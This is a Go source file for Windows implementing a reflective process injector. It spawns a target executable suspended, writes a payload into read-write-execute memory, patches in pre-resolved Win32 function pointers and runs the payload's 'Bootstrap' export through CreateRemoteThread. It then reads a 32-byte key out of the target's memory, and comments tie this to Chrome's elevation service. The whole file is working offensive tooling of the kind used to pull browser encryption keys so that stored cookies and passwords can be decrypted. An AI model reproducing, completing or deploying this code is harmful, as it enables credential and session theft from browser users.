//go:build windows

package injector

import (
	"encoding/binary"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type Reflective struct {
	WaitTimeout time.Duration
}

const (
	exportName = "Bootstrap"
	// 30s covers GoogleChromeElevationService cold-start on first call after boot.
	defaultWait   = 30 * time.Second
	terminateWait = 2 * time.Second

	// Keep in sync with bootstrap.h.
	bootstrapMarkerOffset    = 0x28
	bootstrapKeyStatusOffset = 0x29
	bootstrapKeyOffset       = 0x40
	bootstrapKeyLen          = 32
	bootstrapKeyStatusReady  = 0x01
)

func (r *Reflective) Inject(exePath string, payload []byte, env map[string]string) ([]byte, error) {
	if len(payload) == 0 {
		return nil, fmt.Errorf("injector: empty payload")
	}
	if exePath == "" {
		return nil, fmt.Errorf("injector: empty exePath")
	}

	loaderRVA, err := validateAndLocateLoader(payload)
	if err != nil {
		return nil, err
	}

	patched, err := patchPreresolvedImports(payload)
	if err != nil {
		return nil, err
	}

	restore := setEnvTemporarily(env)
	defer restore()

	pi, err := spawnSuspended(exePath)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	terminated := false
	defer func() {
		if !terminated {
			_ = windows.TerminateProcess(pi.Process, 1)
			_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
		}
	}()

	remoteBase, err := writeRemotePayload(pi.Process, patched)
	if err != nil {
		return nil, err
	}

	// Resume briefly so ntdll loader init completes before we hijack a thread;
	// Bootstrap itself is self-contained but the later elevation_service COM
	// call inside the payload relies on a fully-initialized PEB.
	_, _ = windows.ResumeThread(pi.Thread)
	time.Sleep(500 * time.Millisecond)

	if err := runAndWait(pi.Process, remoteBase, loaderRVA, r.wait()); err != nil {
		return nil, err
	}

	// Read output before TerminateProcess — after kill the memory is gone.
	status, key := readScratch(pi.Process, remoteBase)

	_ = windows.TerminateProcess(pi.Process, 0)
	_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
	terminated = true

	if status != bootstrapKeyStatusReady {
		marker := readMarker(pi.Process, remoteBase)
		return nil, fmt.Errorf("injector: payload did not publish key (status=0x%02x, marker=0x%02x)",
			status, marker)
	}
	return key, nil
}

func (r *Reflective) wait() time.Duration {
	if r.WaitTimeout > 0 {
		return r.WaitTimeout
	}
	return defaultWait
}

func validateAndLocateLoader(payload []byte) (uint32, error) {
	arch, err := DetectPEArch(payload)
	if err != nil {
		return 0, fmt.Errorf("injector: detect payload arch: %w", err)
	}
	if arch != ArchAMD64 {
		return 0, fmt.Errorf("injector: only amd64 payload is supported (got %s)", arch)
	}
	off, err := FindExportFileOffset(payload, exportName)
	if err != nil {
		return 0, fmt.Errorf("injector: locate %s: %w", exportName, err)
	}
	return off, nil
}

func spawnSuspended(exePath string) (*windows.ProcessInformation, error) {
	exePtr, err := syscall.UTF16PtrFromString(exePath)
	if err != nil {
		return nil, fmt.Errorf("injector: exe path: %w", err)
	}
	si := &windows.StartupInfo{}
	pi := &windows.ProcessInformation{}
	if err := windows.CreateProcess(
		exePtr, nil, nil, nil,
		false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, si, pi,
	); err != nil {
		return nil, fmt.Errorf("injector: CreateProcess: %w", err)
	}
	return pi, nil
}

func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")

	remoteBase, _, callErr := procVirtualAllocEx.Call(
		uintptr(proc), 0,
		uintptr(len(payload)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)
	if remoteBase == 0 {
		return 0, fmt.Errorf("injector: VirtualAllocEx: %w", callErr)
	}

	var written uintptr
	r1, _, callErr := procWriteProcessMemory.Call(
		uintptr(proc), remoteBase,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r1 == 0 {
		return 0, fmt.Errorf("injector: WriteProcessMemory: %w", callErr)
	}
	if int(written) != len(payload) {
		return 0, fmt.Errorf("injector: short write to target (%d/%d)", written, len(payload))
	}
	return remoteBase, nil
}

func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait time.Duration) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")

	entry := remoteBase + uintptr(loaderRVA)
	hThread, _, callErr := procCreateRemoteThread.Call(
		uintptr(proc),
		0, 0, entry, 0, 0, 0,
	)
	if hThread == 0 {
		return fmt.Errorf("injector: CreateRemoteThread: %w", callErr)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	_, _ = windows.WaitForSingleObject(windows.Handle(hThread), uint32(wait/time.Millisecond))
	return nil
}

func readScratch(proc windows.Handle, remoteBase uintptr) (status byte, key []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procReadProcessMemory := kernel32.NewProc("ReadProcessMemory")

	var sb [1]byte
	var n uintptr
	r, _, _ := procReadProcessMemory.Call(
		uintptr(proc),
		remoteBase+uintptr(bootstrapKeyStatusOffset),
		uintptr(unsafe.Pointer(&sb[0])),
		1,
		uintptr(unsafe.Pointer(&n)),
	)
	if r == 0 {
		return 0, nil
	}
	status = sb[0]
	if status != bootstrapKeyStatusReady {
		return status, nil
	}

	buf := make([]byte, bootstrapKeyLen)
	r, _, _ = procReadProcessMemory.Call(
		uintptr(proc),
		remoteBase+uintptr(bootstrapKeyOffset),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(bootstrapKeyLen),
		uintptr(unsafe.Pointer(&n)),
	)
	if r == 0 || int(n) != bootstrapKeyLen {
		return status, nil
	}
	return status, buf
}

func readMarker(proc windows.Handle, remoteBase uintptr) byte {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
	var b [1]byte
	var n uintptr
	r, _, _ := procReadProcessMemory.Call(
		uintptr(proc),
		remoteBase+uintptr(bootstrapMarkerOffset),
		uintptr(unsafe.Pointer(&b[0])),
		1,
		uintptr(unsafe.Pointer(&n)),
	)
	if r == 0 {
		return 0
	}
	return b[0]
}

// patchPreresolvedImports writes five pre-resolved Win32 function pointers
// into the payload's DOS stub so Bootstrap skips PEB.Ldr traversal entirely.
// Validity relies on KnownDlls + session-consistent ASLR (kernel32 and ntdll
// share the same virtual address across processes in one boot session).
func patchPreresolvedImports(payload []byte) ([]byte, error) {
	if len(payload) < 0x68 {
		return nil, fmt.Errorf("injector: payload too small for pre-resolved import patch")
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	pLoadLibraryA := kernel32.NewProc("LoadLibraryA").Addr()
	pGetProcAddress := kernel32.NewProc("GetProcAddress").Addr()
	pVirtualAlloc := kernel32.NewProc("VirtualAlloc").Addr()
	pVirtualProtect := kernel32.NewProc("VirtualProtect").Addr()
	pNtFlushIC := ntdll.NewProc("NtFlushInstructionCache").Addr()

	if pLoadLibraryA == 0 || pGetProcAddress == 0 || pVirtualAlloc == 0 ||
		pVirtualProtect == 0 || pNtFlushIC == 0 {
		return nil, fmt.Errorf("injector: failed to resolve one or more pre-resolved imports")
	}

	patched := make([]byte, len(payload))
	copy(patched, payload)

	writeAddr := func(off int, addr uintptr) {
		binary.LittleEndian.PutUint64(patched[off:off+8], uint64(addr))
	}
	writeAddr(0x40, pLoadLibraryA)
	writeAddr(0x48, pGetProcAddress)
	writeAddr(0x50, pVirtualAlloc)
	writeAddr(0x58, pVirtualProtect)
	writeAddr(0x60, pNtFlushIC)

	return patched, nil
}

// setEnvTemporarily mutates the current process's env; NOT concurrency-safe.
// Callers must serialize Inject calls.
func setEnvTemporarily(env map[string]string) func() {
	if len(env) == 0 {
		return func() {}
	}

	type prev struct {
		key   string
		value string
		set   bool
	}
	saved := make([]prev, 0, len(env))
	for k, v := range env {
		old, existed := os.LookupEnv(k)
		saved = append(saved, prev{key: k, value: old, set: existed})
		_ = os.Setenv(k, v)
	}

	return func() {
		for _, p := range saved {
			if p.set {
				_ = os.Setenv(p.key, p.value)
			} else {
				_ = os.Unsetenv(p.key)
			}
		}
	}
}
